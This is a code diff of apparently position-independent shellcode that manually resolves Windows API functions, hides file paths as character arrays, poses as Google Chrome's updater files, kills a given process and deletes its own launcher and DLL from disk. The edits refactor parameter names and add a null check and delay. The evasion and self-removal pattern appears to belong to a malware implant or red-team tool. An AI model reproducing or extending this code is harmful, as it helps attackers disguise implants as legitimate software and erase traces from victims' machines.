@@ -8,11 +8,10 @@
 DWORD
 __declspec(safebuffers)
 __declspec(noinline)
-WINAPI PicStart(struct PicParams* params)
+WINAPI PicStart(struct PicParameters* picParameters)
 {
-	//__debugbreak();
-	pLoadLibraryA loadLibraryA = (pLoadLibraryA)(params->loadLibraryA);
-	pGetProcAddress getProcAddress = (pGetProcAddress)params->getProcAddress;
+	pLoadLibraryA loadLibraryA = (pLoadLibraryA)(picParameters->loadLibraryA);
+	pGetProcAddress getProcAddress = (pGetProcAddress)picParameters->getProcAddress;
 
 	CHAR kernel32Dll[] = { 'k','e','r','n','e','l', '3', '2','.','d','l','l','\0' };
 
@@ -28,8 +27,8 @@ WINAPI PicStart(struct PicParams* params)
 		,'C','h','r','o','m','e','\\','A','p','p','l','i','c','a','t','i','o','n','\\','G','o','o','g','l','e','U','p','d','a','t','e' \
 		,'C','l','i','e','n','t','.','e','x','e','\0' };
 	CHAR dllPath[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','G','o','o','g','l','e','\\' \
-	,'C','h','r','o','m','e','\\','A','p','p','l','i','c','a','t','i','o','n','\\','e','v','e','n','t','l','o','g','_','p','r','o' \
-	,'v','i','d','e','r','.','d','l','l','\0' };
+		,'C','h','r','o','m','e','\\','A','p','p','l','i','c','a','t','i','o','n','\\','e','v','e','n','t','l','o','g','_','p','r','o' \
+		,'v','i','d','e','r','.','d','l','l','\0' };
 
 	// Get function pointers
 	HMODULE kernel32Module = loadLibraryA(kernel32Dll);
@@ -43,10 +42,16 @@ WINAPI PicStart(struct PicParams* params)
 	sleep(3000);
 
 	// Terminate the calling process
-	HANDLE hProcess = openProcess(PROCESS_TERMINATE, FALSE, params->pid);
-	terminateProcess(hProcess, 1);
+	HANDLE hProcess = openProcess(PROCESS_TERMINATE, FALSE, picParameters->pid);
+	if (nullptr != hProcess)
+	{
+		terminateProcess(hProcess, 1);
+	}
 	closeHandle(hProcess);
 
+	// Give the process time to terminate
+	sleep(1000);
+	
 	// Delete files from disk
 	deleteFileA(launcherPath);
 	deleteFileA(dllPath);
